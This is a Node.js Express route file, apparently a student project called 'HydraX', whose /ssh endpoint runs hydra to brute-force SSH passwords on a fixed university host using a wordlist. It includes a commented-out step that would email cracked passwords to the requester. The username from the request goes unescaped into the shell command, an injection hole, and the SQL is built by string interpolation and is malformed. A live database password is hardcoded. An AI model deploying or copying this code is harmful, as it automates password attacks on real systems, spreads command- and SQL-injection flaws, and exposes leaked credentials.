const express = require("express");
const execSh = require("exec-sh");
const bcrypt = require("bcrypt");
const targetIP = "pzi1.fesb.hr";
const targetPORT = "22";
const wordlistPath = "./lists/unix_passwords.txt";
const { exec } = require("child_process");
const execute = require("child_process").exec;
const postgres = require("postgres");

require("dotenv").config();
var nodemailer = require("nodemailer");

let router = express.Router();
const transport = nodemailer.createTransport({
  service: "outlook",
  auth: {
    user: "",
    pass: "", //staviti u .ENV!!
  },
});

const URL = `postgres://petarcelar7:WZQHnrVC2kI7@ep-tight-night-820122.eu-central-1.aws.neon.tech/neondb?options=project%3Dep-tight-night-820122`;
const sqlConnection = postgres(URL, { ssl: "require" });

async function addResult(username) {
  let addResultRecord = await sqlConnection(
    `INSERT INTO account(username, passw) VALUES ('${username}'`
  );
}

router.use(express.json());

router
  .route("/ssh")
  .get((req, res) => {})
  .post((req, res) => {
     new Promise((resolve, reject) => {
      console.log("Client connected")
      const username = req.body.username;
      const email = req.body.email;
      execute(
        `hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -vV -o ./__data/hydra-result-${username}.json -b json`,
        (error, stdout, stderr) => {
          if (error) console.warn(error);
          resolve(stdout ? stdout : stderr);
          res.send(
            stdout +
              " for username " +
              `${username} ` +
              " on " +
              `${targetIP}` +
              ". You will receive results on e-mail provided. Made by @petarcelar" +
              "\n https://pjeppsi/hydraX"
          );
          console.log("Action finished");
        }
      );
      // const resultPath = `./data/hydra-result-${username}.json`;
      // const file = require(resultPath);
      //     let condition = file.quantityfound;
      //     if (condition > 0) {
      //       let result = file.results;
      //       var mailContent = {
      //         from: "pcelar00@fesb.hr",
      //         to: `${email}`,
      //         subject: "HydraX scan results",
      //         text: `${result}`,
      //       };
      //       transport.sendMail(mailContent, function (error, info) {
      //         if (error) {
      //           console.log(error);
      //         } else {
      //           console.log("Email sent" + info.response);
      //         }
      //       });
      //     }
      //     if (
      //       condition == 0 ||
      //       condition != 1 ||
      //       condition != 2 ||
      //       condition != 3
      //     ) {
      //       var mailContent = {
      //         from: "pcelar00@fesb.hr",
      //         to: `${email}`,
      //         subject: `HydraX scan results for ${username}`,
      //         text: `Sorry, no matching passwords were found for ${username}.`,
      //       };
      //       transport.sendMail(mailContent, function (error, info) {
      //         if (error) {
      //           console.log(error);
      //         } else {
      //           console.log("Email sent" + info.response);
      //         }
      //       });
      //     }
    });
          
          
  });

module.exports = router;
